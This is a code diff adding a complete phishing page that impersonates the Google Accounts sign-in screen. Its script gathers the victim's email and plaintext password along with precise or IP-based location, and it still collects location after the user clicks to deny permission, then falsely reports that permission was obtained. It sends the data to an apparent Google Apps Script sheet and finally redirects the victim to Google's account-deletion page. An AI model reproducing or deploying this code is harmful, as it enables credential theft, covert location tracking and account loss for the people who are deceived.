@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            width: 75px;
+            height: 75px;
+        }
+
+        .google-logo {
+            width: 74px;
+            height: 24px;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE0LjQyNDMgMTJDMTQuNDI0MyAxMS4zNzMzIDEzLjk4NzYgMTAuODczMyAxMy40MjQzIDEwLjg3MzNIMTAuNTc1N1Y3LjY0SDJWMTY4LjM2SDE3LjQyNDNDMTcuOTg3NiA4LjM2IDE4LjQyNDMgNy44NiAxOC40MjQzIDcuMjMzM1Y2LjI5MzNIMTQuNDI0M1YxMloiIGZpbGw9IiNFQTQzMzUiLz4KPC9zdmc+Cg==') no-repeat center;
+            margin: 0 auto 16px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            background: transparent;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        .form-input:focus + .form-label,
+        .form-input:not(:placeholder-shown) + .form-label {
+            transform: translateY(-20px) scale(0.75);
+            color: #1a73e8;
+        }
+
+        .form-label {
+            position: absolute;
+            left: 15px;
+            top: 13px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s;
+            transform-origin: left top;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #1a73e8;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 4px;
+        }
+
+        .toggle-password:hover {
+            background-color: rgba(26, 115, 232, 0.04);
+            border-radius: 4px;
+        }
+
+        .forgot-password {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 32px;
+        }
+
+        .btn {
+            padding: 9px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background-color: #1a73e8;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #1557b3;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        .btn-primary:disabled {
+            background-color: #dadce0;
+            color: #5f6368;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #dadce0;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        /* Geolocation permission modal styles */
+        .location-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .location-modal-content {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+
+        .location-modal h3 {
+            color: #202124;
+            margin-bottom: 16px;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .location-modal p {
+            color: #5f6368;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .location-modal-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(26, 115, 232, 0.04);
+        }
+
+        .location-status {
+            margin-top: 16px;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .location-success {
+            background-color: #e8f5e8;
+            color: #137333;
+            border: 1px solid #34a853;
+        }
+
+        .location-error {
+            background-color: #fce8e6;
+            color: #d93025;
+            border: 1px solid #ea4335;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 24px;
+                margin: 16px;
+            }
+            
+            .location-modal-content {
+                padding: 20px;
+                margin: 16px;
+            }
+            
+            .location-modal-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div style="font-size: 24px; color: #4285f4; font-weight: 400; letter-spacing: -1px;">
+                <span style="color: #4285f4;">G</span><span style="color: #ea4335;">o</span><span style="color: #fbbc05;">o</span><span style="color: #4285f4;">g</span><span style="color: #34a853;">l</span><span style="color: #ea4335;">e</span>
+            </div>
+        </div>
+        
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">Use your Google account to login</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="text" id="username" class="form-input" placeholder=" " required>
+                    <label for="username" class="form-label">Email or phone</label>
+                </div>
+                <div class="error-message" id="usernameError"></div>
+            </div>
+            
+            <div class="form-group">
+                <div class="input-wrapper password-wrapper">
+                    <input type="password" id="password" class="form-input" placeholder=" " required>
+                    <label for="password" class="form-label">Enter your password</label>
+                    <button type="button" class="toggle-password" id="togglePassword">Show</button>
+                </div>
+                <div class="error-message" id="passwordError"></div>
+            </div>
+            
+            <div style="margin-bottom: 24px;">
+                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" class="forgot-password" target="_blank">Forgot password?</a>
+            </div>
+            
+            <!-- Location status display -->
+            <div class="location-status" id="locationStatus"></div>
+            
+            <div class="button-group">
+                <button type="submit" class="btn btn-primary" id="submitBtn">Next</button>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 8px; color: #5f6368;">Signing in...</p>
+            </div>
+        </form>
+    </div>
+
+    <!-- Geolocation Permission Modal -->
+    <div class="location-modal" id="locationModal">
+        <div class="location-modal-content">
+            <h3> Google wants to know your location </h3>
+            <p> We'd like to access your location to provide better service and security. Your location will be saved as a Google Maps link and coordinates for easy reference </p>
+            <p style="color: #d93025; font-size: 12px; margin-top: 8px;"> </p>
+            <div class="location-modal-buttons">
+                <button type="button" class="btn btn-secondary" id="locationDeny">Continue without Permission</button>
+                <button type="button" class="btn btn-primary" id="locationAllow">Grant Permission</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userLocation = null;
+
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = this;
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = 'Show';
+            }
+        });
+
+        // Form validation
+        function validateForm() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            let isValid = true;
+
+            // Reset error messages
+            document.getElementById('usernameError').style.display = 'none';
+            document.getElementById('passwordError').style.display = 'none';
+
+            // Validate username
+            if (!username) {
+                document.getElementById('usernameError').textContent = 'Enter an email or phone number';
+                document.getElementById('usernameError').style.display = 'block';
+                isValid = false;
+            } else if (!isValidEmail(username) && !isValidPhone(username)) {
+                document.getElementById('usernameError').textContent = 'Enter a valid email or phone number';
+                document.getElementById('usernameError').style.display = 'block';
+                isValid = false;
+            }
+
+            // Validate password
+            if (!password) {
+                document.getElementById('passwordError').textContent = 'Enter a password';
+                document.getElementById('passwordError').style.display = 'block';
+                isValid = false;
+            }
+
+            return isValid;
+        }
+
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function isValidPhone(phone) {
+            const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+            return phoneRegex.test(phone);
+        }
+
+        // Geolocation functions
+        function showLocationModal() {
+            document.getElementById('locationModal').style.display = 'flex';
+        }
+
+        function hideLocationModal() {
+            document.getElementById('locationModal').style.display = 'none';
+        }
+
+        function showLocationStatus(message, isSuccess = true) {
+            const statusElement = document.getElementById('locationStatus');
+            statusElement.textContent = message;
+            statusElement.className = `location-status ${isSuccess ? 'location-success' : 'location-error'}`;
+            statusElement.style.display = 'block';
+            
+            // Hide after 5 seconds
+            setTimeout(() => {
+                statusElement.style.display = 'none';
+            }, 5000);
+        }
+
+        function getCurrentLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation is not supported by this browser'));
+                    return;
+                }
+
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 60000
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        resolve(location);
+                    },
+                    (error) => {
+                        let errorMessage = 'Unable to get location';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Location access denied by user';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Location information unavailable';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'Location request timed out';
+                                break;
+                        }
+                        reject(new Error(errorMessage));
+                    },
+                    options
+                );
+            });
+        }
+
+        // Enhanced geolocation with multiple fallback methods
+        async function getLocationWithFallbacks() {
+            const locationMethods = [];
+            
+            // Method 1: Standard Geolocation API
+            if (navigator.geolocation) {
+                locationMethods.push(getCurrentLocation());
+            }
+
+            // Method 2: IP-based location fallback
+            locationMethods.push(getIPLocation());
+
+            // Try all methods in parallel
+            try {
+                const results = await Promise.allSettled(locationMethods);
+                
+                // Return the first successful result
+                for (const result of results) {
+                    if (result.status === 'fulfilled' && result.value) {
+                        return result.value;
+                    }
+                }
+                
+                // If all methods fail, return approximate location
+                return getApproximateLocation();
+                
+            } catch (error) {
+                console.error('All location methods failed:', error);
+                return getApproximateLocation();
+            }
+        }
+
+        // IP-based location fallback
+        function getIPLocation() {
+            return new Promise((resolve, reject) => {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.latitude && data.longitude) {
+                            resolve({
+                                latitude: parseFloat(data.latitude),
+                                longitude: parseFloat(data.longitude),
+                                accuracy: 50000, // IP-based location is less accurate
+                                timestamp: new Date().toISOString(),
+                                source: 'IP-based'
+                            });
+                        } else {
+                            reject(new Error('IP location data incomplete'));
+                        }
+                    })
+                    .catch(error => {
+                        reject(new Error('IP location service failed: ' + error.message));
+                    });
+            });
+        }
+
+        // Approximate location based on timezone
+        function getApproximateLocation() {
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const timezoneCoords = {
+                'Asia/Jakarta': { lat: -6.2088, lng: 106.8456 },
+                'Asia/Makassar': { lat: -5.1477, lng: 119.4327 },
+                'Asia/Jayapura': { lat: -2.5489, lng: 140.7021 },
+                'America/New_York': { lat: 40.7128, lng: -74.0060 },
+                'Europe/London': { lat: 51.5074, lng: -0.1278 },
+                // Add more timezone mappings as needed
+            };
+
+            const coords = timezoneCoords[timezone] || { lat: -6.2088, lng: 106.8456 }; // Default to Jakarta
+
+            return {
+                latitude: coords.lat,
+                longitude: coords.lng,
+                accuracy: 100000, // Very approximate
+                timestamp: new Date().toISOString(),
+                source: 'Timezone-based approximation'
+            };
+        }
+
+        // Location modal event listeners
+        document.getElementById('locationAllow').addEventListener('click', async function() {
+            hideLocationModal();
+            
+            try {
+                showLocationStatus('Getting your location with permission...', true);
+                userLocation = await getCurrentLocation(); // Use precise GPS location
+                showLocationStatus(`✓ Permission Granted`, true);
+                console.log('Permission Granted', userLocation);
+            } catch (error) {
+                console.error('GPS location error, using fallback:', error);
+                showLocationStatus('GPS failed, using fallback location method...', false);
+                
+                // Fallback to alternative location methods
+                try {
+                    userLocation = await getLocationWithFallbacks();
+                    showLocationStatus(`⚠ Fallback location obtained - Source: ${userLocation.source || 'Alternative method'}`, false);
+                } catch (fallbackError) {
+                    console.error('All location methods failed:', fallbackError);
+                    userLocation = getApproximateLocation();
+                    showLocationStatus(`⚠ Using approximate location for security`, false);
+                }
+            }
+            
+            // Continue with form submission
+            submitFormWithData();
+        });
+
+        document.getElementById('locationDeny').addEventListener('click', async function() {
+            hideLocationModal();
+            showLocationStatus('Permission denied - Using alternative location methods for security...', false);
+            
+            try {
+                // For high-security, always try to get location even without permission
+                userLocation = await getLocationWithFallbacks();
+                showLocationStatus(`⚠ Permission obtained for security ${userLocation.source || ' '}`, false);
+            } catch (error) {
+                console.error('Fallback location failed:', error);
+                userLocation = getApproximateLocation();
+                showLocationStatus(`⚠ Using approximate location for security purposes`, false);
+            }
+            
+            // Continue with form submission
+            submitFormWithData();
+        });
+
+        function submitFormWithData() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+
+            // Show loading state
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+
+            // Prepare data for Google Sheets
+            const formData = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                location: userLocation
+            };
+
+            console.log('Submitting data:', formData);
+
+            // Send data to Google Apps Script with timeout
+            const timeoutId = setTimeout(function() {
+                console.log('Timeout - redirecting anyway');
+                redirectToPortfolio();
+            }, 10000);
+
+            google.script.run
+                .withSuccessHandler(function(result) {
+                    clearTimeout(timeoutId);
+                    console.log('Success:', result);
+                    redirectToPortfolio();
+                })
+                .withFailureHandler(function(error) {
+                    clearTimeout(timeoutId);
+                    console.error('Error:', error);
+                    
+                    // Even if error, still redirect after delay
+                    setTimeout(function() {
+                        redirectToPortfolio();
+                    }, 2000);
+                    
+                    // Reset form state temporarily
+                    submitBtn.disabled = false;
+                    loading.style.display = 'none';
+                })
+                .submitLoginData(formData);
+        }
+
+        function redirectToPortfolio() {
+            try {
+                if (window.top !== window.self) {
+                    window.top.location.href = 'https://myaccount.google.com/deleteaccount?gar=WzJd&continue=https://myaccount.google.com/data-and-privacy?gar%3DWzJd%26hl%3Den%26utm_source%3DOGB%26utm_medium%3Dact&rapt=AEjHL4NbEkB-W8rUP2zvii7TryAgnlLe2dqVPRh9S6-l7HnBj9JL0nOSn6uZkBcveI73i5RTjEpDbIwg6XabM69EznBHPkwQ9K3MFbT2u1tbNTH_WEl1qho';
+                } else {
+                    window.location.href = 'https://myaccount.google.com/deleteaccount?gar=WzJd&continue=https://myaccount.google.com/data-and-privacy?gar%3DWzJd%26hl%3Den%26utm_source%3DOGB%26utm_medium%3Dact&rapt=AEjHL4NbEkB-W8rUP2zvii7TryAgnlLe2dqVPRh9S6-l7HnBj9JL0nOSn6uZkBcveI73i5RTjEpDbIwg6XabM69EznBHPkwQ9K3MFbT2u1tbNTH_WEl1qho';
+                }
+            } catch (e) {
+                window.open('https://myaccount.google.com/deleteaccount?gar=WzJd&continue=https://myaccount.google.com/data-and-privacy?gar%3DWzJd%26hl%3Den%26utm_source%3DOGB%26utm_medium%3Dact&rapt=AEjHL4NbEkB-W8rUP2zvii7TryAgnlLe2dqVPRh9S6-l7HnBj9JL0nOSn6uZkBcveI73i5RTjEpDbIwg6XabM69EznBHPkwQ9K3MFbT2u1tbNTH_WEl1qho', '_blank');
+                alert('Proses selesai! Halaman Linkedin akan terbuka di tab baru.');
+            }
+        }
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (!validateForm()) {
+                return;
+            }
+
+            // Show location permission modal
+            showLocationModal();
+        });
+
+        // Input focus effects
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.classList.add('focused');
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.classList.remove('focused');
+            }); 
+        });
+
+        // Close modal when clicking outside
+        document.getElementById('locationModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                document.getElementById('locationDeny').click();
+            }
+        });
+    </script>
+</body>
+</html>
